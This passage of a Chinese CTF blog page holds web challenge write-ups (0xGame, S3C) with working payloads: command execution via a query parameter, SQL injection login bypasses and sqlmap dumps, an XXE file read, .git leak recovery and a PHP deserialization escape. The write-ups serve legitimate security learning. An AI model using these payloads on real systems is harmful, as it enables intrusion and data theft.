        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$host</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$items</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$last</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n[<span class="token interpolation"><span class="token variable">$host</span></span>] -> <span class="token interpolation"><span class="token variable">$last</span></span>\n\n"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"item"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;html>&lt;head>&lt;meta http-equiv="Content-Type" Content="text/html; Charset=utf-8">&lt;/head>'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;body bgcolor="#e8ddcb">'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;b>Log Helper&lt;/b>&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token variable">$show_form</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token variable">$main</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span></code></pre>


<p>可以任意文件读取下载</p>
<h3>最终</h3>
payload：./?strip_slashes=system&host=cat /flag

<p>问题解决：0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</p>
<h2 id="just-login"><a href="#just-login" class="headerlink" title="just_login"></a>just_login</h2><h3 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h3><h4 id="题目地址：http-web-game-0xctf-com-30055"><a href="#题目地址：http-web-game-0xctf-com-30055" class="headerlink" title="题目地址：http://web.game.0xctf.com:30055/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30055/">http://web.game.0xctf.com:30055/</a></h4><p>dirsearch扫不到东西</p>
<p>sqlmap跑一下没用</p>
<p>不知道干啥，直接burp抓包用户名爆破<br>真爆出来了</p>
<h3>最终</h3>
payload：
<pre class="language-none"><code class="language-none">&#39; or 0&#x3D;0 #
&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;
x&#39; or 1&#x3D;1 or &#39;x&#39;&#x3D;&#39;y</code></pre>



<p>问题解决：0xGame{e5sy_sql_1njeCtion}</p>
<h2 id="close-eyes"><a href="#close-eyes" class="headerlink" title="close_eyes"></a>close_eyes</h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="题目地址：http-web-game-0xctf-com-30052"><a href="#题目地址：http-web-game-0xctf-com-30052" class="headerlink" title="题目地址：http://web.game.0xctf.com:30052/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30052/">http://web.game.0xctf.com:30052/</a></h4><h2 id="inject-me"><a href="#inject-me" class="headerlink" title="inject_me"></a>inject_me</h2><h3 id="XXE显式攻击"><a href="#XXE显式攻击" class="headerlink" title="XXE显式攻击"></a>XXE显式攻击</h3><h4 id="题目地址：http-web-game-0xctf-com-30061"><a href="#题目地址：http-web-game-0xctf-com-30061" class="headerlink" title="题目地址：http://web.game.0xctf.com:30061/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30061/">http://web.game.0xctf.com:30061/</a></h4><h3 id="最终-5"><a href="#最终-5" class="headerlink" title="最终"></a>最终</h3><p>payload：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">GVI</span> <span class="token punctuation">[</span><span class="token internal-subset"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre>



<p>问题解决：0xGame{V2ry_simple_XXE}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/0XGame-WEB-Write-up/" data-id="cklc0zh1e0001fpov08ch6ww9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XFF/" rel="tag">XFF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-S3C WEB Write-up" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/S3C%20WEB%20Write-up/" class="article-date">
  <time datetime="2020-09-20T08:18:25.000Z" itemprop="datePublished">2020-09-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/S3C%20WEB%20Write-up/">S3C WEB Write-up</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>by:gyy</p>
<h2>WEB-常见的搜集</h2>
<h3>信息收集</h3>
题目链接：<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a>

<hr />
敏感文件
Hello, CTFer!
信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西

<p>hack fun</p>
<hr />
<h4>yysy,确实</h4>
信息收集
<h5>Part1</h5>
遇事不决，先扫为敬
真·找到了
<pre><code>/.index.php.swp
</code></pre>
知识链接：.swp文件是备份文件，平时vim强退一定要注意.swp文件的删除！

<p>进去访问下载<br><? php echo 'flag3:cDBydGFudF9oYWNr}';?></p>
<p>发现flag3，说明flag分为好多部分</p>
<h5>Part2</h5>
扫描还扫到了
<pre><code>/index.php~
</code></pre>
直接访问得
flag2:c192M3J5X2lt
<h5>Part3</h5>
将扫描进行到底
还扫到了
<pre><code>/robots.txt
</code></pre>
进去康康
<pre><code>User-agent: *
Disallow:
/flag1_is_her3_fun.txt
</code></pre>
访问得
flag1:aW5mb18x
<h3>最终</h3>
组合得flag
<h5>小结</h5>
扫就完事了
<h2>WEB-粗心的小李</h2>
<h3>Git泄露</h3>
题目链接：<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a>

<hr />
Git测试
Hello, CTFer!
当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。

<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p>
<p>very easy</p>
<hr />
<h4>Git</h4>
访问<code>./.git</code>发现跳转到了<code>./.git/</code>
根据题目是git泄露
<h5>神器Git Hack</h5>
命令：
<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"
</code></pre>
扒下来.git文件
<h5>分析</h5>
命令看一下
<pre><code>$ git log --reflog
commit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)
Author: Veneno <593220746@qq.com>
Date:   Wed Dec 4 11:04:14 2019 +0800

<p>flag<br></code></pre><br>发现有flag<br>恢复一下（注意，这里要往上一个目录）</p>
<pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88
HEAD is now at 213b7e3 flag
</code></pre>
<p>恢复了<code>index.html</code></p>
<h3>最终</h3>
在<code>index.html</code>里找到flag

<p>问题解决：n1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}</p>
<h5>小结</h5>
Git hack好用，还有个git extrack

<hr />
<h2>WEB-SQL注入-1</h2>
<h3>SQL注入</h3>
题目链接：<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a>

<hr />
<h4>SQLmap真香</h4>
<h5>sql注入不说了</h5>
sqlmap直接跑
由于是POST测试，抓个包下来存文件，在name处改个<code>*</code>
跑sqlmap
<pre><code>$ python2 sqlmap.py -r 1.txt
</code></pre>
出结果
<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:
</code></pre>

<hr />
<pre><code>Parameter: #1* ((custom) POST)
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</code></pre>
<h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5>
<hr />
<pre><code> [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0
</code></pre>
ok，直接全扒下来<code>--dump</code>
<pre><code>Database: note
Table: users
[2 entries]
+----+----------------------------------+----------+
| id | passwd                           | username |
+----+----------------------------------+----------+
| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     |
| 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |
+----+----------------------------------+----------+
</code></pre>
<h3>最终</h3>
<h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>
问题解决：n1book{bG9naW5fc3FsaV9pc19uaWNl}
<h5>小结</h5>
善用Sqlmap，能跑出来的不多了...

<hr />
<h2>Unserialize++</h2>
<h3>反序列化字符串逃逸</h3>
guest.php
先上payload打到admin，字符串逃逸成功
<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4>
<h3>index.php中</h3>
<pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));
</code></pre>
而
<pre><code>function put($data)&#123;
$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);
return $data;
&#125;
</code></pre>
每6个u换三个字符，使得name盖过pass的字符并"闭合，然后反序列化就会读取我们准备的字符，即从
<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;'
</code></pre>
的分号开始

<p>本地./caches/下的内容</p>
<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;
</code></pre>
<p>即后get</p>
<pre><code>function get($data)&#123;
$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);
return $data;
&#125;
</code></pre>
<p>会读取</p>
<pre><code>"O:7:\"someone\":3:&#123;s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;&#125;\";s:8:\"\\u0000*\\u0000admin\";i:0;&#125;"
</code></pre>
<p>忽略不可见字符后<br>读取到其中</p>
<pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA
 [your_pass:protected] => AA 
 [admin:protected] => 1
</code></pre>
<p>然而本题和admin<strong>没有</strong>任何关系</p>
<h3>构造</h3>
<pre><code>O:6:"level1":1:&#123;s:8:"username";O:6:"level2":1:&#123;s:8:"username";O:6:"level3":1:&#123;s:8:"username";s:5:"admin";&#125;&#125;&#125;
</code></pre>
payload =
your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}

<hr />
check不允许匹配到"username"字符串

<p>于是准备绕过<br>类型的字符S使用大写<br>u=\75</p>
<hr />
level2中有__wakeup()方法，于是绕过
<pre><code>O:6:"level2":2
</code></pre>
例如本题，
<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;
</code></pre>
我们有u x60，最后换成字符30个，于是反序列化会继续向下读取
<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |（到此为止）
</code></pre>
然后"正常闭合，这样接下来就会读取我们构造的字符串，字符串成功逃逸
<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;|（到此为止）
</code></pre>
下面无用了，因为}正常闭合，反序列化结束
<pre><code>";s:8:"uuuuuuadmin";i:0;&#125;
</code></pre>
以上是admin的方法，取flag原理方法同上
<h3>最终</h3>
payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}

<p>再访问./guest.php解决</p>
<p>问题解决：s3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}</p>
<h5>小结：</h5>
字符串逃逸字符个数<strong>一定</strong>要算好！（吐血
      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/S3C%20WEB%20Write-up/" data-id="cklc0zh1m000pfpovdgko0xea" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Git%E6%B3%84%E9%9C%B2/" rel="tag">Git泄露</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/Hello%20World/" class="article-date">
  <time datetime="2020-08-31T16:00:00.000Z" itemprop="datePublished">2020-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/Hello%20World/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>hello</p>
        
          <p class="article-more-link">
            <a href="/article/Hello%20World/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/Hello%20World/" data-id="cklc0zh1v0035fpovca4s8vfj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页 &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Programme/">Programme</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-Up/">Write-Up</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/">杂谈笔记</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/">菜鸡教程</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git%E6%B3%84%E9%9C%B2/" rel="tag">Git泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MISC/" rel="tag">MISC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/" rel="tag">OOB带外攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XFF/" rel="tag">XFF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XPath%E6%B3%A8%E5%85%A5/" rel="tag">XPath注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-whale/" rel="tag">ctf-whale</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctfd/" rel="tag">ctfd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/netcat/" rel="tag">netcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pgsql/" rel="tag">pgsql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" rel="tag">伪加密</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" rel="tag">内存取证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">无参数RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" rel="tag">明文攻击</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Git%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">Git泄露</a> <a href="/tags/MISC/" style="font-size: 10px;">MISC</a> <a href="/tags/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/" style="font-size: 10px;">OOB带外攻击</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 16.67px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XFF/" style="font-size: 13.33px;">XFF</a> <a href="/tags/XPath%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">XPath注入</a> <a href="/tags/XXE/" style="font-size: 13.33px;">XXE</a> <a href="/tags/ctf-whale/" style="font-size: 10px;">ctf-whale</a> <a href="/tags/ctfd/" style="font-size: 10px;">ctfd</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/md5/" style="font-size: 10px;">md5</a> <a href="/tags/netcat/" style="font-size: 10px;">netcat</a> <a href="/tags/pgsql/" style="font-size: 10px;">pgsql</a> <a href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">伪加密</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 13.33px;">信息收集</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" style="font-size: 10px;">内存取证</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 20px;">反序列化</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 13.33px;">文件上传</a> <a href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" style="font-size: 10px;">无参数RCE</a> <a href="/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" style="font-size: 13.33px;">明文攻击</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/article/hgame2021week1/">HGAME2021-week1</a>
          </li>
        
          <li>
            <a href="/article/2021gongcesai/">CnHongKe2021公测赛</a>
          </li>
        
          <li>
            <a href="/article/cqb2021/">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a>
          </li>
        
          <li>
            <a href="/article/djbctf2021/">DJBCTF2021</a>
          </li>
        
          <li>
            <a href="/article/2021/">2021</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 gyy<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>
</html>